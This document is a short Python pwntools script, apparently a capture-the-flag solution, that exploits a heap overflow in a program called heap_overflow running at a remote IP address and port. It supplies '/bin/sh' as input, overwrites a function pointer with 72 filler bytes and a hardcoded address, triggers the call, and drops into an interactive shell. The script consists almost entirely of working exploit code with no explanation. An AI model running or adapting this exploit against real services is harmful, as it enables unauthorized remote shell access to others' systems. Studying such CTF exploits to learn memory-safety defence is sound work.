from pwn import *

#r = process('./heap_overflow')
r = remote('45.77.51.4', 8890)
#r = gdb.debug('./heap_overflow', '''b *0x804896c''')
print(r.recvuntil("name:"))
system_cmd = "/bin/sh"
r.sendline(system_cmd)
print(r.recvuntil("begun:"))
r.sendline("2017")

print(r.recvuntil("Choice:"))
#firstly we want to print our original ABN for sanity.
r.sendline("3")
print(r.recvuntil("Choice:"))

#now we want to craft our payload and overflow the function ptr
whatsthis = 0x808a118
newname = "A"*72 + p32(whatsthis)
newyear = "80"
r.sendline("1")
print(r.recvuntil("name:"))
r.sendline(newname)
print(r.recvuntil("begun:"))
r.sendline(newyear)

#now lets trigger the overflow!
print(r.recvuntil("Choice:"))
r.sendline("3")

print(r.recv())
r.interactive()




